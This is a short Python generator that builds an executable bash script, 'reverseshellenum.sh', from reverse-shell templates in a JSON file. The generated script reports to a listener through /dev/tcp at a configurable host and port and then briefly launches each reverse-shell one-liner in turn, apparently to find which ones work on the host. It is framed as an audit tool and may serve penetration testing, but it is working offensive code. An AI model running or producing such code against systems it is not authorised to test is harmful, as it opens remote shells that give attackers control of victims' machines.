#!/bin/env python3

import json
import shlex
import os

with open('shells.json', 'r') as f:
    shells = json.load(f)

LHOST = os.environ.get("LHOST", "127.0.0.1")
LPORT = os.environ.get("LPORT", "31373")

NON_COMMAND_LINE_PREFIXES = [
    '<?php',
    '#include ',
    'using ',
    'module ',
]

with open('reverseshellenum.sh', 'w') as f:
    f.write('#!/bin/bash\n')
    f.write(f'HOST=/dev/tcp/{LHOST}/{LPORT}\n')
    f.write('echo "[i] Starting Reverse Shell Audit" > $HOST\n')
    for shell in shells:
        template = shell["command"]
        command = template.replace("{shell}", "sh").replace("{ip}", LHOST).replace("{port}", LPORT)
        if any(command.startswith(fragment) for fragment in NON_COMMAND_LINE_PREFIXES):
            continue
        f.write(f'echo "[i] Attempting {shell["name"]}"\n')
        f.write(f'echo "[i] Attempting {shell["name"]}" > $HOST\n')
        f.write(f'echo ">> {command}"\n')
        f.write(f'sleep 0.01\n')
        wrapped_command = f'bash -c {shlex.quote(command)}'
        f.write(f'set -m; ({wrapped_command}) & set +m; PID="$!"\n')
        f.write(f'sleep 0.2\n')
        f.write(f'kill -9 -- -"$PID"\n')
        
    f.write('echo "[i] Ending Reverse Shell Audit" > $HOST\n')
os.system("chmod a+x reverseshellenum.sh")
